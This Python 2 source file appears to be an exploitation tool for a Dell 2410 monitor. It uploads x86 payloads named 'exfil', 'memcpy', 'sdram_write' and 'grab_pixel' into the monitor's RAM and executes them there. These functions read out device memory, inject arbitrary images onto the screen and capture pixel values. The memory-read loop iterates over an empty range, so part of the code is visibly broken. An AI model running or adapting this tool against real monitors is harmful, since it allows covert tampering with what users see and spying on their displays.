import struct
import copy
import time

from payload import X86Payload
from protocol import Dell2410

VERBOSE = False


FREE_REG_ADDR_START = 0x3a5a
FREE_REG_ADDR_END = 0x3a5a

SRAM_CMD_MEM_START = 0xc000
SRAM_CMD_MEM_END = 0xc800
SEGMENT_MAX_LIMIT = 2 ** 16


def bulk_write_data(dev, addr, data):
    off_s = range(0, len(data), 100)
    off_e = off_s[1:]
    off_e.append(len(data))
    for start, end in zip(off_s, off_e):
        dev.ram_write(addr + start, data[start:end])


def mem_read(dev, segment=0xf000, start_offset=0, l=0x2000):
    extracted_mem = ''
    end_offset = start_offset + l
    payload = X86Payload("exfil")
    payload.replace_word(0xadad, segment)
    try:
        for i in xrange(start_offset, end_offset, 6):
            new = copy.deepcopy(payload)
            new.replace_word(0xacac, i)
            execute_payload(dev, new, 0x500)
            time.sleep(0.03)
            for i in range(FREE_REG_ADDR_END, FREE_REG_ADDR_END, 2):
                extracted_mem += dev.reg_read(i)
                time.sleep(0.03)
    except Exception as e:
        print str(e)
    finally:
        return extracted_mem


def execute_payload(dev, payload, ram_addr=0x6000):
    bulk_write_data(dev, ram_addr, payload.data)
    dev.execute(ram_addr)


def clear_0xc000(dev):
    for i in range(SRAM_CMD_MEM_START, SRAM_CMD_MEM_END, 100):
        dev.ram_write(i, '\x00' * 100)


def bulk_sdram_write(dev, x, reg_hi, reg_lo=0):
    step = 0x1000
    i = 0
    j = 0
    k = 0
    free_mem_addr = 0x4000
    while k < len(x):
        end = step
        if i + step > len(x):
            end = len(x) - i
        y = x[i: end]
        bulk_write_data(dev, free_mem_addr, y)
        sdram_write(dev, src_seg=0x0, src_off=free_mem_addr, reg_hi=reg_hi + j,
                    reg_lo=i + reg_lo, height=1, width=end, stride=end,
                    ram_write_addr=0x670)
        i += end
        k += end
        if i == SEGMENT_MAX_LIMIT:
            j += 1
            i = 0


def upload_single_image(dev, image, upload_address):
    bitmap_image, clut_table = image.image, image.table
    addr = upload_address
    width = int(image.width / 2)
    stride = int(image.width / 2)
    height = image.height
    for i in range(0, len(bitmap_image), 8000):
        bulk_write_data(dev, 0x4000, bitmap_image[i:i + 8000])
        addr_hi = addr >> 8
        addr_lo = addr & 0xff
        memcpy(dev, addr_hi, 0x0, addr_lo, 0x4000, 8000)
        addr += 8000
        print '*:' * 10, i, addr
    return (width, height, stride, upload_address, clut_table), addr


def all_images_upload(dev, images, start_address=0x600000):
    clear_0xc000(dev)
    meta_infos = []
    offset = start_address
    for image in images:
        meta_info, offset = upload_single_image(dev, image, offset)
        meta_infos.append(meta_info)
    return meta_infos


def put_image(dev, images_metainfo, x=0, y=0):
    clut_table = images_metainfo[4]
    width = images_metainfo[0]
    height = images_metainfo[1]
    stride = images_metainfo[2]
    upload_address = images_metainfo[3]
    upload_address_hi = upload_address >> 8
    upload_address_lo = upload_address & 0xff
    clear_0xc000(dev)
    sdram_write(dev, src_seg=upload_address_hi, src_off=upload_address_lo,
                reg_hi=0, reg_lo=0, height=height, width=width,
                stride=stride, ram_write_addr=0x600)

    transfer_clut(dev, clut_table)
    control = '\x00' * 24                   # [:24]
    control += '\x04\x04'                   # color
    control += struct.pack('<H', x)         # x coord
    control += struct.pack('<H', width)     # width
    control += struct.pack('<H', width)     # expansion level!?
    control += '\x00\x00'                   # sdram location
    control += struct.pack('<H', height)    # height
    control += struct.pack('<H', y)         # y coord
    control += '\x1b\x00'                   # transperency and patterns , 8 bits only
    bulk_write_data(dev, 0xc078, control)


def sdram_read(dev, dst_off=0, read_off=0, reg_hi=0, reg_lo=0, height=0, width=0,
               stride=0, ram_write_addr=0x500):
    payload = X86Payload("sdram_read")
    payload.replace_word(0xadad, dst_off)
    payload.replace_word(0xacac, read_off)
    payload.replace_word(0xaeae, height)
    payload.replace_word(0xafaf, width)
    payload.replace_word(0xbdbd, stride)
    payload.replace_word(0xbcbc, reg_hi)
    payload.replace_word(0xbebe, reg_lo)
    execute_payload(dev, payload, ram_write_addr)


def sdram_write(dev, src_seg=0, src_off=0, reg_hi=0, reg_lo=0, height=0, width=0,
                stride=0, ram_write_addr=0x690):
    payload = X86Payload("sdram_write")
    payload.replace_word(0xacac, src_off)
    payload.replace_word(0xadad, src_seg)
    payload.replace_word(0xaeae, height)
    payload.replace_word(0xafaf, width)
    payload.replace_word(0xbdbd, stride)
    payload.replace_word(0xbcbc, reg_hi)
    payload.replace_word(0xbebe, reg_lo)
    execute_payload(dev, payload, ram_write_addr)


def memcpy(dev, dst_seg, src_seg, dst_off, src_off, len):
    payload = X86Payload("memcpy")
    payload.replace_word(0xadad, dst_seg)
    payload.replace_word(0xabab, src_seg)
    payload.replace_word(0xacac, dst_off)
    payload.replace_word(0xaeae, src_off)
    payload.replace_word(0xafaf, len)
    execute_payload(dev, payload, 0x600)


def grab_pixel(dev, vertical_coord, horizontal_coord, memory_dump_addr=0x4000):
    """grab pixel values in R G B format """
    payload = X86Payload("grab_pixel")
    payload.replace_word(0xaeae, vertical_coord)
    payload.replace_word(0xbebe, horizontal_coord)
    payload.replace_word(0xcece, memory_dump_addr)
    execute_payload(dev, payload, 0x600)
    segment_hi = memory_dump_addr >> 16
    segment_lo = memory_dump_addr & 0xffff
    extracted_dump_data = mem_read(dev, segment=segment_hi,
                                   start_offset=segment_lo, l=0x6)

    color_val = {
        'R': struct.unpack('<H', extracted_dump_data[:2]),
        'G': struct.unpack('<H', extracted_dump_data[2:4]),
        'B': struct.unpack('<H', extracted_dump_data[4:6]),
    }
    return color_val


def transfer_clut(dev, clut_table, clut_low=0x7000):
    payload = X86Payload("transfer_clut")
    payload.replace_word(0xadad, 0x0000)  # clut_high
    payload.replace_word(0xacac, clut_low)
    bulk_write_data(dev, clut_low, clut_table)
    execute_payload(dev, payload, 0x600)
